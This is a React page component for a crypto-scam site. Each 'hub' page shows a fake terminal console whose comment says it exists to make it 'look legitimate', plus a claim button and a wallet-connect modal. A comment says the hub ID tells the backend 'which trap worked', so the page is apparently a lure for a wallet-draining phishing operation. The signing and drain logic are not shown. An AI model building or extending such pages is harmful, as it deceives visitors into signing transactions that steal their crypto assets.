import { useRoute } from "wouter";
import { motion } from "framer-motion";
import { hubConfig } from "../config/hub-config"; 
import { ClaimButton } from "@/components/claim-button";
import { WalletConnectModal } from "@/components/wallet-connect-modal";
import { Card, CardContent } from "@/components/ui/card";
import { Terminal } from "lucide-react";

const HubPage = () => {
  // 1. Get the ID from the URL (e.g., /hub/1) using Wouter
  const [match, params] = useRoute("/hub/:id");
  const hubId = params?.id;

  // 2. Find the specific theme data for this Hub from your config
  const currentHub = hubConfig.find((h) => h.id === Number(hubId));

  // 3. Safety Check: If someone enters /hub/99 by mistake
  if (!currentHub) {
    return (
      <div className="flex items-center justify-center h-screen bg-black text-red-500 font-mono">
        [ERROR]: HUB_DIVISION_NOT_FOUND
      </div>
    );
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="min-h-screen bg-[#050505] text-white flex flex-col items-center pt-24 px-4 font-inter"
    >
      {/* Dynamic Header: Changes text based on the ID */}
      <div className="text-center max-w-2xl mb-10">
        <h1 className="text-5xl font-bold font-space mb-4 uppercase tracking-tighter text-white">
          {currentHub.title}
        </h1>
        <p className="text-gray-400 text-lg">
          {currentHub.description}
        </p>
      </div>

      {/* Main UI Card */}
      <Card className="w-full max-w-md bg-[#0d0d0d] border-[#1a1a1a] border-t-2" style={{ borderTopColor: currentHub.color || '#222' }}>
        <CardContent className="pt-6">
          <div className="space-y-6">
            {/* The "Technical" Console: Makes it look legitimate */}
            <div className="p-3 rounded bg-black/60 border border-[#222] font-mono text-[10px] text-emerald-500/80">
              <p className="flex items-center gap-2"><Terminal size={12}/> {'>'} INITIALIZING SECURE_HANDSHAKE...</p>
              <p className="">{'>'} SCANNING FOR {currentHub.title.toUpperCase()} ASSETS...</p>
              <p className="animate-pulse">{'>'} AWAITING_WALLET_SIGNATURE...</p>
            </div>
            
            {/* THE FIX: Passing the hubId so Neon knows which trap worked */}
            <div className="flex flex-col gap-3">
               <ClaimButton hubId={Number(hubId)} />
            </div>
            
            <p className="text-[9px] text-center text-gray-500 uppercase tracking-[0.2em]">
              VndrSync Infrastructure Protocol v2.6
            </p>
          </div>
        </CardContent>
      </Card>

      <WalletConnectModal />
    </motion.div>
  );
};

export default HubPage;
